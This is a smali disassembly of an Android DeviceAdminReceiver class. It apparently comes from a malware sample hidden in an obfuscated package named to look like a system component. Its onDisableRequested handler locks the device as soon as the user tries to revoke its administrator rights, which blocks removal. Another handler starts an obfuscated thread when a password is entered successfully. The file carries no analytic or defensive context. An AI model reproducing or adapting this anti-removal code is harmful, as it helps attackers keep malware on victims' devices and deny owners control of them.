.class public Lcom/android/x5a807058/DeviceAdmin;
.super Landroid/app/admin/DeviceAdminReceiver;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/admin/DeviceAdminReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onDisableRequested(Landroid/content/Context;Landroid/content/Intent;)Ljava/lang/CharSequence;
    .locals 1

    const/4 v0, 0x0

    invoke-static {v0}, Lcom/android/x5a807058/bb;->a(Landroid/content/Context;)Lcom/android/x5a807058/bb;

    move-result-object v0

    invoke-virtual {v0}, Lcom/android/x5a807058/bb;->lockNow()V

    const-string v0, "Are you sure?"

    return-object v0
.end method

.method public onDisabled(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 0

    return-void
.end method

.method public onEnabled(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 0

    return-void
.end method

.method public onPasswordChanged(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 0

    return-void
.end method

.method public onPasswordSucceeded(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 1

    new-instance v0, Lcom/android/x5a807058/c;

    invoke-direct {v0, p0}, Lcom/android/x5a807058/c;-><init>(Lcom/android/x5a807058/DeviceAdmin;)V

    invoke-virtual {v0}, Lcom/android/x5a807058/c;->start()V

    return-void
.end method
